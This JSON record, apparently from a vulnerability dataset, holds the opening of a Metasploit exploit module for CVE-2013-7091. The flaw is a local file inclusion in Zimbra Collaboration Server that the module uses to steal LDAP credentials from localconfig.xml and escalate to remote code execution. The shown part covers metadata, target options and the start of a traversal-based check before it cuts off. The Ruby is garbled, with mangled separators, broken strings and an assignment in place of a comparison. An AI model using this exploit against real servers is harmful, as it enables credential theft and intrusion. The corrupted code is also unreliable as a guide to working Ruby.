{
    "text": "vul_name : Zimbra 8.0.2 and 7.2.2 Collaboration Server LFI Metasploit Exploit ， vul_cve : CVE-2013-7091 ， vul_poc :  ，  # This module requires Metasploit : http/metasploit.com/download ，  # Current source :  ， require 'msf/core' ， require 'rexml/document' ， class Metasploit3 < Msf : Exploit : Remote ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， include REXML ， Rank = ExcellentRanking ， super ( update_info ( info ,  ， 'Name' => 'Zimbra Collaboration Server LFI' ,  ， 'Description' => %q{ ， This module exploits a local file inclusion on Zimbra 8.0.2 and 7.2.2. The vulnerability ， allows an attacker to get the LDAP credentials from the localconfig.xml file. The stolen ， credentials allow the attacker to make requests to the service/admin/soap API. This can ， then be used to create an authentication token for the admin web interface. This access ， can be used to achieve remote code execution. This module has been tested on Zimbra ， Collaboration Server 8.0.2 with Ubuntu Server 12.04. ， } ,  ， 'Author' => ，  [  ， 'rubina119' ,  # Vulnerability discovery ， 'Mekanismen <mattias [ at ] gotroot.eu>' # Metasploit module ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [  ，  [ 'CVE' , '2013-7091' ]  ,  ，  [ 'OSVDB' , '100747' ]  ,  ，  [ 'BID' , '64149' ]  ,  ，  [ 'EDB' , '30085' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Privileged' => false ,  ， 'Platform' => [ 'linux' ]  ,  ， 'Targets' => ，  [  ，  [ 'Zimbra 8.0.2 / Linux' ,  ， { ， 'Arch' => ARCH_X86 ,  ， 'Platform' => 'linux' ， } ，  ]  ,  ，  ]  ,  ， 'DefaultOptions' => ， { ， 'SSL' => true ， } ,  ， 'DefaultTarget' => 0 ,  ， 'DisclosureDate' => \"Dec 06 2013\" ， register_options (  ，  [  ， Opt : RPORT ( 7071 )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , 'Path to zimbraAdmin web application' , '/zimbraAdmin' ]  )  ,  ， OptInt.new ( 'DEPTH' ,  [ true , 'Traversal depth until to reach the root path' , 9 ]  )  ,  ， OptString.new ( 'ZIMBRADIR' ,  [ true , 'Zimbra installation path on the target filesystem ( /opt/zimbra by default ) ' , '/opt/zimbra' ]  )  ，  ]  )  ， end ， def check ， res = send_traversal_query ( traversal_path ( \"conf/localconfig.xml\" )  ， unless res and res.code = 200",
    "time": "2013.12.23"
}